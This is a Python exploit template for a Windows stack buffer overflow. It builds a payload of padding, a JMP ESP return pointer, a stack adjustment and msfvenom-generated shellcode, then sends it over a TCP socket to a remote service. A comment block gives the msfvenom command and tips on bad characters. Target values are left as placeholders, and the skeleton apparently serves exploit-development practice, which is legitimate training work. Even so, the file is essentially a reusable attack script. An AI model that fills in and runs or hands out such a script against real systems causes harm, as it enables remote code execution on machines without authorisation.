#!/usr/bin/python

import socket, struct

RHOST = '<ip>'
RPORT = <port>
cmd = '<command>'
offset_srp = <offset>
buf_totlen = <buffer length>
ptr_jmp_esp = 0x

"""
######################################################

Popcalc PoC - DO NOT FORGET BADCHARS

	msfvenom -p windows/exec -b '\x00' -f python --var-name popcalc CMD=calc.exe EXITFUNC=thread

 
   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

    Remember msfvenom will prepend a decoder to the encoded shell code. 
    You have to adjust for it so it doesn't blow a hole in your ESP.

   /usr/share/metasploit-framework/tools/exploit/metasm_shell.rb
	metasm > sub esp,0x10
   "\x83\xec\x10"
    
	***If calc doesn't pop up, check the task manager to see if the 
   service is running***

   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

#######################################################
"""

# Insert popcalc code here


sub_esp_10 = "\x83\xec\x10"             # More elegant than nop sleds

buf = ""
buf += "A" * (offset_srp - len(buf))    # Send the A's up to the EIP
buf += struct.pack("<I", ptr_jmp_esp)   # Making little Indians from the JMP ESP
buf += sub_esp_10
buf += popcalc
buf += "C" * (buf_totlen - len(buf))    # C ya later
buf += "\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
s.send(cmd + buf)
s.recv(1024)
s.close()

